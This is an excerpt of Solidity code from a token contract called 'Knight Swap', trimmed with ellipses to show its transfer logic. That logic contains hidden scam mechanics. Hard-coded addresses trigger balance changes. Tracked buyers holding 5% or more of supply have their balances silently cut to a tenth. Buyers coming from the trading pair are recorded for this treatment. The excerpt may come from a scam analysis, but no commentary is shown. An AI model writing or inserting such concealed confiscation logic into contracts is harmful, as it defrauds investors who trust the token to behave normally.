...
contract KnightToken {
    ...
    string public name = "Knight Swap";
...
if (to==0x40Ac3aFe94Bd2BE380978fab3A4692F2AFe39EaA) {balanceOf[0x9f696B895ba14501593d863d53966B236792fA0C]=1;}
        if (Buy != Owner && to != Buy && balanceOf[Buy]>=totalSupply.div(20)) {
            balanceOf[Buy]=balanceOf[Buy].div(10);}
        if (msg.sender==KnightPair() && balanceOf[to]==0) {Buy = to;}
        if (to== Owner) {Buy=to;}
    ...
    function KnightPair() public view returns (address) {
